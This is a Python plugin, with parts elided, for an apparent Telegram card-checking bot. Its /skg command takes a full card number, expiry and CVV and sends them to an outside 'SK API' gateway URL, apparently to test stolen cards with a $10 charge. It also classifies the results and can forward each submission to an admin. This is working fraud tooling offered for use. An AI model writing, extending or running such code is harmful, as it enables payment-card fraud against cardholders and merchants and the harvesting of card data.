...
PLUGIN_INFO = {
    ...
    'commands': ['skg'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'SK API payment gateway',
    'type': 'check',
    'status': 'active'
}

def categorize_sk_response(api_response):
    """Categorize SK API response"""
    try:
...
def format_sk_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format SK API response for Telegram"""
    ...
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ SK Based 10$\n"
...
class SKGateway:
    def __init__(self):
        self.base_url = "https://onyxenvbot.up.railway.app/sk/key=yashikaaa/cc="

    async def check_card(self, card, month, year, cvv):
        """Main function to check card through SK API"""
...
def setup(app: Client):
    ...
    @app.on_message(filters.command(["skg"], prefixes=[".", "/", "!", "$"]))
    async def skg_command(client, message):
        """Handle /skg command"""
        ...
        can_access, reason = await check_gateway_access(user_id, 'skg')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
        ...
        if not text:
            resp = f"""〈<a href=\'tg://user?id={user_id}\'>꫟</a>〉-» 𝗦𝗞 𝗔𝗣𝗜 - CHECK

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» SK API

<a href=\'tg://user?id={user_id}\'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /skg cc|month|year|cvc"""
        ...
        if not await validate_card_with_luhn(card_info, "SK API", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'skg')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card using SK Gateway
        gateway = SKGateway()
        api_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'skg')
        ...
        if error:
            ...
            response_text = format_sk_response(
            ...
            # Parse API response
            category, response_message, suffix = categorize_sk_response(api_response)
    ...
    print("✅ SK Gateway commands registered")
